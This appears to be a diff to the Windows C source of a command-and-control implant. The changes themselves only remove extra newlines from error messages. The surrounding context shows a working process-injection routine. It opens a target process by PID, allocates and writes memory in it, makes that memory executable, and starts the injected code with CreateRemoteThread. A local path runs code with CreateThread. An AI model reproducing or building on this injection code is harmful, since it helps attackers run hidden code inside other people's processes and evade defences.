@@ -16,7 +16,7 @@ VOID CmdDllInejct(unsigned char* commandBuf, size_t commandBuflen, BOOL x86) {
 
 	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, injectPid);
 	if (!hProcess) {
-		fprintf(stderr, "OpenProcess failed with error:%lu\n\n", GetLastError());
+		fprintf(stderr, "OpenProcess failed with error:%lu\n", GetLastError());
 		return;
 	}
 
@@ -105,7 +105,7 @@ unsigned char* localAllocdata(unsigned char* buffer, size_t length) {
 
 	void* ptr = VirtualAlloc(NULL, allocsz, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 	if (ptr == NULL) {
-		fprintf(stderr, "VirtualAlloc failed with error:%lu\n\n", GetLastError());
+		fprintf(stderr, "VirtualAlloc failed with error:%lu\n", GetLastError());
 		return NULL;
 	}
 	memcpy(ptr, buffer, length);
@@ -116,7 +116,7 @@ unsigned char* localAllocdata(unsigned char* buffer, size_t length) {
 
 	DWORD oldProtect = 0;
 	if(!VirtualProtect(ptr, allocsz, PAGE_EXECUTE_READ, &oldProtect)) {
-		fprintf(stderr, "VirtualAlloc (PAGE_EXECUTE_READ) failed with error:%lu\n\n", GetLastError());
+		fprintf(stderr, "VirtualAlloc (PAGE_EXECUTE_READ) failed with error:%lu\n", GetLastError());
 		VirtualFree(ptr, 0, MEM_RELEASE);
 		return NULL;
 	}
@@ -124,7 +124,7 @@ unsigned char* localAllocdata(unsigned char* buffer, size_t length) {
 	// 刷新指令缓存，确保 CPU 可以看到我们写入的指令
 	if (!FlushInstructionCache(GetCurrentProcess(), ptr, allocsz)) {
 		// 失败不一定致命，但记录
-		fprintf(stderr, "FlushInstructionCache failed with error: %lu\n\n", GetLastError());
+		fprintf(stderr, "FlushInstructionCache failed with error: %lu\n", GetLastError());
 	}
 
 	return (unsigned char*)ptr;
@@ -145,14 +145,14 @@ unsigned char* remoteAllocdata(INJECTCONTEXT* context, unsigned char* buffer, si
 	void* ptr = VirtualAllocEx(context->hProcess, NULL, allocsz, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 
 	if (!ptr) {
-		fprintf(stderr, "VirtualAllocEx failed with error:%lu\n\n", GetLastError());
+		fprintf(stderr, "VirtualAllocEx failed with error:%lu\n", GetLastError());
 		return NULL;
 	}
 
 	// 写入全部数据
 	size_t actuallyWritten = 0;
 	if (!WriteProcessMemory(context->hProcess, (BYTE*)ptr, buffer, length, &actuallyWritten)) {
-		fprintf(stderr, "WriteProcessMemory failed with error: %lu\n\n", GetLastError());
+		fprintf(stderr, "WriteProcessMemory failed with error: %lu\n", GetLastError());
 		VirtualFreeEx(context->hProcess, ptr, 0, MEM_RELEASE);
 		return NULL;
 	}
@@ -165,7 +165,7 @@ unsigned char* remoteAllocdata(INJECTCONTEXT* context, unsigned char* buffer, si
 
 	DWORD oldProtect = 0;
 	if (!VirtualProtectEx(context->hProcess, ptr, allocsz, PAGE_EXECUTE_READ, &oldProtect)) {
-		fprintf(stderr, "VirtualProtectEx failed with error: %lu\n\n", GetLastError());
+		fprintf(stderr, "VirtualProtectEx failed with error: %lu\n", GetLastError());
 		VirtualFreeEx(context->hProcess, ptr, 0, MEM_RELEASE);
 		return NULL;
 	}
@@ -173,7 +173,7 @@ unsigned char* remoteAllocdata(INJECTCONTEXT* context, unsigned char* buffer, si
 	// 刷新目标进程指令缓存
 	if (!FlushInstructionCache(context->hProcess, ptr, allocsz)) {
 		// 记录但不一定致命 
-		fprintf(stderr, "FlushInstructionCache failed with error: %lu\n\n", GetLastError());
+		fprintf(stderr, "FlushInstructionCache failed with error: %lu\n", GetLastError());
 	}
 
 	return (unsigned char*)ptr;
@@ -184,7 +184,7 @@ VOID InjectProcessExecute(INJECTCONTEXT* context, unsigned char* ptr, size_t off
 	if (context->samePid) {
 		HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(ptr + offset), parameter, 0, NULL);
 		if (!hThread) {
-			fprintf(stderr, "CreateThread failed with error:%lu\n\n", GetLastError());
+			fprintf(stderr, "CreateThread failed with error:%lu\n", GetLastError());
 			return;
 		}
 		CloseHandle(hThread);
@@ -193,7 +193,7 @@ VOID InjectProcessExecute(INJECTCONTEXT* context, unsigned char* ptr, size_t off
 	else {
 		HANDLE hThread = CreateRemoteThread(context->hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(ptr + offset), parameter, 0, NULL);
 		if (!hThread) {
-			fprintf(stderr, "CreateRemoteThread failed with error:%lu\n\n", GetLastError());
+			fprintf(stderr, "CreateRemoteThread failed with error:%lu\n", GetLastError());
 			return;
 		}
 		CloseHandle(hThread);
